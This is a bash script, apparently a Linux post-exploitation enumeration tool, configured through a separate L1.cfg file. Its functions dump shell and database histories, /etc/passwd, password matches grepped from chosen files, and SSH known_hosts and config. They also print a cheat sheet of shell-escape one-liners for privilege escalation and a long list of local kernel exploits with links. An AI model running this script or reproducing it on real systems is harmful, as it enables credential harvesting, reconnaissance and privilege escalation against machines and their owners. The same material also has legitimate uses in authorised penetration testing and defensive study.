#!/bin/bash

# |=====================|
# | Versias 1.1 [PUPS]  |
# |=====================|
# L1.cfg - configuration file
# !! FILE L1.cfg MUST BE IN THE SAME FOLDERS AS L1.sh !!
# PUMPKIN YA DADA 
source ./L1.cfg

#Function to check cfg file in fn1
if [[ ! -f "$fn1" ]]; then
    echo "File $fn1 does not exist!"
fi


#Function to check cfg file in fn2
if [[ ! -f "$fn2" ]]; then
    echo "File $fn2 does not exist!"
fi


#Function to check cfg file in fn3
if [[ ! -f "$fn3" ]]; then
    echo "File $fn3 does not exist!"
fi


# Function to check if the user is root
is_root() {
    if [ "$(id -u)" -ne 0 ]; then
        echo "Root privileges are required for some commands."
        return 1  # Not root
    else
        return 0  # Root
    fi
}


echo "==========================================="
echo "Script start. by PUMPKIN YA DADA"
echo "==========================================="


# -------------------------------------------------
# Function to get system information
# -------------------------------------------------
get_system_info() {
    if [[ $1 -eq 1 ]] 
    then
        echo ":::::::: SYSTEM-DISTRIBUTION ::::::::"
        cat /etc/*-release
        echo "+--------------------------------------+"
        cat /proc/version
        uname -a
        uname -mrs
        uname -m
        rpm -q kernel
        dmesg | grep Linux
        ls /boot | grep vmlinuz
        read
    fi 
}


# -------------------------------------------------
# Function to get network information
# -------------------------------------------------
get_network_info() {
    if [[ $1 -eq 1 ]] 
    then
        echo ":::::::: NETWORKS ::::::::"
        /sbin/ifconfig -a
        cat /etc/network/interfaces
        iptables -L
        hostname
        dnsdomainname
        read
    fi
}


# -------------------------------------------------
# Function to get process and application information
# -------------------------------------------------
get_processes_info() {
    if [[ $1 -eq 1 ]] 
    then
        echo ":::::::: PROCESSES-APPLICATIONS ::::::::"
        ps aux
        ps -ef
        cat /etc/services
        ps aux | grep root
        ps -ef | grep root
        ls -alh /usr/bin/
        ls -alh /sbin/
        dpkg -l
        crontab -l
        ls -alh /var/spool/cron
        ls -al /etc/ | grep cron
        ls -al /etc/cron*
        cat /etc/cron*
        cat /etc/crontab
        read
    fi
}


# -------------------------------------------------
# Function to get user information
# -------------------------------------------------
get_user_info() {
    if [[ $1 -eq 1 ]] 
    then
        echo ":::::::: WHO-AM-I ::::::::"
        id
        who
        w
        last
        cat /etc/passwd | cut -d: -f1  # List of users
        awk -F: '($3 == "0") {print}' /etc/passwd  # List of super users
        read
    fi
}


# -------------------------------------------------
# Function to get network connections and services
# -------------------------------------------------
get_connection_info() {
    if [[ $1 -eq 1 ]] 
    then
        echo ":::::::: USERS-HOST ::::::::"
        lsof -i
        lsof -i :80
        grep 80 /etc/services
        netstat -antup
        netstat -antpx
        netstat -tulpn
        chkconfig --list
        chkconfig --list | grep 3:on
        last
        w
        read
    fi
}


# -------------------------------------------------
# Function to get log and audit information
# -------------------------------------------------
get_logs_info() {
    if [[ $1 -eq 1 ]] 
    then
        echo ":::::::: LOGS-LOG-AUDIT ::::::::"
        #cat ~/.bash_history
        cat ~/.*sh_history
        cat ~/.nano_history
        cat ~/.atftp_history
        cat ~/.mysql_history
        cat ~/.php_history
        read
    fi
}


# -------------------------------------------------
# Function to get passwd and shadow information
# -------------------------------------------------
get_passwd_shadow_info() {
    if [[ $1 -eq 1 ]] 
    then
        echo ":::::::: PASSWD-SHADOW ::::::::"
        cat /etc/passwd
        cat /etc/group
        ls -alh /var/mail/
        ls -ahlR /home/
        # The next lines require root privileges
        # cat /etc/shadow  # Requires root
        # ls -ahlR /root/  # Requires root
        read
    fi
}


# -------------------------------------------------
# Function to grep for passwords and user information
# -------------------------------------------------
get_passwd_shadow_grep_info() {
    if [[ $1 -eq 1 ]] 
    then
        echo ":::::::: PASSWD-SHADOW-GREP ::::::::"
        grep -i user $fn1  #--> L1.cfg
        grep -i pass $fn2  #--> L1.cfg
        grep -C 5 "password" $fn3  #--> L1.cfg
        read
    fi
}


# -------------------------------------------------
# Function to get general information
# -------------------------------------------------
get_general_info() {
    if [[ $1 -eq 1 ]] 
    then
        echo ":::::::: OTHER-INFO ::::::::"
        echo -e "\nDate-"
        date
        echo -e "\nSudo-"
        sudo -l
        echo "SMART disk status:"
        # The following block requires root privileges
        if is_root; then
            # Example of checking SMART status
            for disk in /dev/sd?; do
                echo "SMART status for $disk:"
                smartctl -a $disk | grep -i "smart"
            done
        fi

        if command -v sensors &> /dev/null; then
            echo -e "\nCPU temperature:"
            sensors
        else
            echo -e "\nError -sensor"
        fi

        echo -e "\nJournal logs:"
        # The following line requires root privileges
        if is_root; then
            journalctl -n 20
        fi
        read
    fi
}


# -------------------------------------------------
# Function to get ssh gnupg dir
# -------------------------------------------------
get_ssh_gnupg_dir() { #need root
    if [[ $1 -eq 1 ]] 
    then
        echo ":::::::: SSH-GNUPG-DIR ::::::::"
        SSH_DIR="$HOME/.ssh"
        GNUPG_DIR="$HOME/.gnupg"
        # Check if the directories exist
        if [ ! -d "$SSH_DIR" ]; then #need root
            echo "Error: directory $SSH_DIR does not exist!"
            exit 1
        fi
        if [ ! -d "$GNUPG_DIR" ]; then #need root
            echo "Error: directory $GNUPG_DIR does not exist!"
            exit 1
        fi
        # Show contents of ~/.ssh
        echo "Contents of $SSH_DIR:"
        ls -l "$SSH_DIR"
        echo
        # Show contents of ~/.gnupg
        echo "Contents of $GNUPG_DIR:"
        ls -l "$GNUPG_DIR"
        echo
        read
    fi
}


# -------------------------------------------------
# Function to get hosts ssh config
# -------------------------------------------------
get_hosts_ssh_config () {
    if [[ $1 -eq 1 ]] 
    then
        echo ":::::::: HOSTS-SSH-CONFIG ::::::::"
        # Define the known hosts file and SSH configuration file
        KNOWN_HOSTS="$HOME/.ssh/known_hosts"
        SSH_CONFIG="$HOME/.ssh/config"
        # Check if the known_hosts file exists
        if [ -f "$KNOWN_HOSTS" ]; then
            echo "Contents of the file $KNOWN_HOSTS (known hosts):"
            cat "$KNOWN_HOSTS"
        else
            echo "Error: file $KNOWN_HOSTS not found!"
        fi
        echo

        # Check if the SSH config file exists
        if [ -f "$SSH_CONFIG" ]; then
            echo "Contents of the file $SSH_CONFIG (SSH configuration):"
            cat "$SSH_CONFIG"
        else
            echo "Error: file $SSH_CONFIG not found!"
        fi
        read
    fi 
}


# -------------------------------------------------
# Function to get privilege escalation
# -------------------------------------------------
get_privilege_escalation () {
    if [[ $1 -eq 1 ]] 
    then
        echo ""
        echo $yellowintensy"[+] Escape the shell:"$white
        echo "awk    =	awk 'BEGIN {system(\"/bin/sh\")}'"
        echo "perl   =	perl -e 'exec \"/bin/sh\";'"
        echo "python = 	python -c 'import pty;pty.spawn(\"/bin/sh\")'"
        echo "php    =	php -r 'system(\"/bin/sh\");'"
        echo "ruby   =	ruby -e 'exec \"/bin/sh\"'"
        echo "less   =	!sh"
        echo "more   =	!sh"
        echo "man    =	!sh"
        echo "nmap   =	--interactive"
        echo "nmap   =	echo \"os.execute('/bin/sh')\" > /tmp/shell.nse"
        echo "find   =	find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/sh\")}' \;"
        echo "find   =	find / -exec sh -i \;"
        echo "vi     =	:!sh or :shell or -c '!sh'"
        echo "vim    =	:!sh or :shell or -c '!sh'"
        echo "gdb    =	shell"
        echo "pinfo  =	! -> less -> !sh"
        echo "mutt   =	! -> sh"
        echo "expect =	expect or expect -> sh"
        echo "docker =	docker exec -ti {CONTAINER_ID} bash"
        echo "ftp    =	!sh"
        echo "irb    =	exec '/bin/sh'"
        echo "ed     =	!'/bin/sh'"
        echo "links  =	ESC -> FILE -> OS Shell"
        echo "lynx   =	lynx --editor=/usr/bin/vi www.postenum.com"
        echo "/      =	/bin/bash or /bin/sh"
        echo "cp     =	cp /bin/bash escape_bash -> ./escape_bash"
        echo "tar    =	tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'"
        echo "tar    =	tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
        echo "node   =	node -e 'var exec = require(\"child_process\").exec; exec(\"id\", function (error, stdOut, stdErr) {console.log(stdOut);});'"
        echo ""
        echo $redintensy" ** You can replace the 'sh' with 'bash'** "$white
        echo ""
        read
    fi
}



# -------------------------------------------------
# Function to get exploits
# -------------------------------------------------
get_exploits () {
    if [[ $1 -eq 1 ]]  
    then
        echo $redintensy"Linux Kernel 2.6.22 < 3.9 Dirty Cow$white - https://www.exploit-db.com/exploits/40839"
        echo $redintensy"Linux Kernel 2.6.22 < 3.9 Dirty Cow (x86-x64)$white - https://www.exploit-db.com/exploits/40616"
        echo $redintensy"Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4)$white - https://www.exploit-db.com/exploits/44298"
        echo $redintensy"Linux kernel < 4.10.15 Race Condition$white - https://www.exploit-db.com/exploits/43345"
        echo $redintensy"Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)$white - https://www.exploit-db.com/exploits/45010"
        echo $redintensy"Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset'$white - https://www.exploit-db.com/exploits/44300"
        echo $redintensy"Linux Kernel < 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass$white - https://www.exploit-db.com/exploits/44299"
        echo $redintensy"Linux Kernel 2.4.x/2.6.x$white - https://www.exploit-db.com/exploits/9545"
        echo $redintensy"UDEV < 1.4.1 (1)$white - https://www.exploit-db.com/exploits/8478"
        echo $redintensy"UDEV < 1.4.1 (2)$white - https://www.exploit-db.com/exploits/8572"
        echo $redintensy"UDEV < 1.4.1 (Metasploit)$white - https://www.exploit-db.com/exploits/21848"	
        echo $redintensy"Linux Kernel 2.6 < 2.6.19$white - https://www.exploit-db.com/exploits/9542"
        echo $redintensy"Linux Kernel 2.6.0 < 2.6.31(1)$white - https://www.exploit-db.com/exploits/33321"
        echo $redintensy"Linux Kernel 2.6.x (2)$white - https://www.exploit-db.com/exploits/33322"
        echo $redintensy"Linux Kernel 2.6.x$white - https://www.exploit-db.com/exploits/30604"
        echo $redintensy"Linux Kernel 2.6.39 < 3.2.2 Gentoo / Ubuntu x86-x64 Mempodipper(1)$white - https://www.exploit-db.com/exploits/18411"
        echo $redintensy"Linux Kernel 2.6.39 < 3.2.2 x86-x64 Mempodipper(2)$white - https://www.exploit-db.com/exploits/35161"
        echo $redintensy"Linux kernel < 4.10.15 Race Condition$white - https://www.exploit-db.com/exploits/43345"
        echo $redintensy"Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4)$white - https://www.exploit-db.com/exploits/44298"
        echo $redintensy"Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)$white - https://www.exploit-db.com/exploits/45010"
        echo $redintensy"Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset'$white - https://www.exploit-db.com/exploits/44300"
        echo $redintensy"Linux Kernel < 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass$white - https://www.exploit-db.com/exploits/44299"
        echo $redintensy"Linux Kernel 4.3.3 Overlayfs$white - https://www.exploit-db.com/exploits/39230"
        echo $redintensy"Linux Kernel 4.3.3 (Ubuntu 14.04/15.10)$white - https://www.exploit-db.com/exploits/39166"
        echo $redintensy"Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64)$white - https://www.exploit-db.com/exploits/40871"
        echo $redintensy"Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x86-64)$white - https://www.exploit-db.com/exploits/47170"
        echo $redintensy"Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04)$white - https://www.exploit-db.com/exploits/43418"
        echo $redintensy"Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4)$white - https://www.exploit-db.com/exploits/44298"
        echo $redintensy"Linux Kernel 4.4.1$white - https://www.exploit-db.com/exploits/40003"
        echo $redintensy"Linux Kernel 4.8.0 (UDEV < 232) - https://www.exploit-db.com/exploits/41886"
        echo $redintensy"Linux kernel < 4.10.15 Race Condition$white - https://www.exploit-db.com/exploits/43345"
        echo $redintensy"Linux Kernel 4.13 (Debian 9)$white - https://www.exploit-db.com/exploits/44303"
        echo $redintensy"Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)$white - https://www.exploit-db.com/exploits/45010"
        echo $redintensy"Linux Kernel 4.14.0-rc4+$white - https://www.exploit-db.com/exploits/43029"
        echo $redintensy"Linux Kernel 4.15.x < 4.19.2 (polkit Method)$white - https://www.exploit-db.com/exploits/47167"
        echo $redintensy"Linux Kernel 4.15.x < 4.19.2 (cron Method)$white - https://www.exploit-db.com/exploits/47164"
        echo $redintensy"Linux Kernel 4.10 < 5.1.17$white - https://www.exploit-db.com/exploits/47163"
        echo $redintensy"Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset'$white - https://www.exploit-db.com/exploits/44300"
        echo $redintensy"Linux Kernel 4.13 (Ubuntu 17.10) - 'waitid()' SMEP/SMAP/Chrome Sandbox$white - https://www.exploit-db.com/exploits/43127"
        echo $redintensy"Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)$white - https://www.exploit-db.com/exploits/47169"
        echo $redintensy"Linux Kernel 4.8.0-34 < 4.8.0-45 (Ubuntu / Linux Mint) - Packet Socket Local Privilege Escalation$white - https://www.exploit-db.com/exploits/47168"
        echo $redintensy"Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Leak$white - https://www.exploit-db.com/exploits/46529"
        echo $redintensy"Linux Kernel 4.10 < 5.1.17$white - https://www.exploit-db.com/exploits/47163"
        echo $redintensy"Linux 5.3$white - https://www.exploit-db.com/exploits/47779"
        echo $redintensy"Linux 5.3 - Privilege Escalation via io_uring Offload of sendmsg() onto Kernel Thread with Kernel Creds$white - https://www.exploit-db.com/exploits/47779"
        echo $redintensy"Linux Kernel 5.1.x - 'PTRACE_TRACEME' pkexec LPE$white - https://www.exploit-db.com/exploits/50541"
        echo $redintensy"Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation$white - https://www.exploit-db.com/exploits/50135"
        echo $redintensy"Linux Kernel 6.2 - Userspace Processes To Enable Mitigation$white - https://www.exploit-db.com/exploits/51384"
        echo $redintensy"Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)$white - https://www.exploit-db.com/exploits/50808"
        echo $redintensy"Linux Kernel 5.14 < 6.6 - Universal Local Privilege Escalation$white - https://github.com/Notselwyn/CVE-2024-1086"
        echo $redintensy"Ubuntu 23.04 (Lunar Lobster)|Ubuntu 22.10 (Kinetic Kudu)|Ubuntu 22.04 LTS (Jammy Jellyfish)|Ubuntu 20.04 LTS (Focal Fossa)|Ubuntu 18.04 LTS (Bionic Beaver)| Local Privilege Escalation$white - https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability"
        read
    fi
}




#-------------------------------------------------------------------------------------------|
# Call all functions                                    # PUMPKIN YA DADA                   |
#-------------------------------------------------------------------------------------------|
# !!! OPEN L1.cfg TO CUSTOMIZE THE SCRIPT BY CHANGING THE VALUE OF VARIABLES !!!            |
# NAME VARIABLES IN L1.CFG                              BY DEFAULT ALL SETTINGS ARE 1       |  
get_system_info $system_info                            # system_info                       |
get_network_info $network_info                          # network_info                      |
get_processes_info $processes_info                      # processes_info                    |
get_user_info $user_info                                # user_info                         |
get_connection_info $connection_info                    # connection_info                   |
get_logs_info $logs_info                                # logs_info                         |
get_passwd_shadow_info $passwd_shadow_info              # passwd_shadow_info                |
get_passwd_shadow_grep_info $passwd_shadow_grep_info    # passwd_shadow_grep_info           |
get_general_info $general_info                          # general_info                      |
get_ssh_gnupg_dir $ssh_gnupg_dir                        # ssh_gnupg_dir                     |
get_hosts_ssh_config $hosts_ssh_config                  # hosts_ssh_config                  |
get_privilege_escalation $privilege_escalation          # privilege_escalation              |
get_exploits $exploits                                  # exploits                          |
#-------------------------------------------------------------------------------------------|
echo "===========================================" #                                        |            
echo "Script finished. by PUMPKIN YA DADA"          #                                       |
echo "===========================================" #                                        |
# PUMPKIN YA DADA                                                                           |
#-------------------------------------------------------------------------------------------|
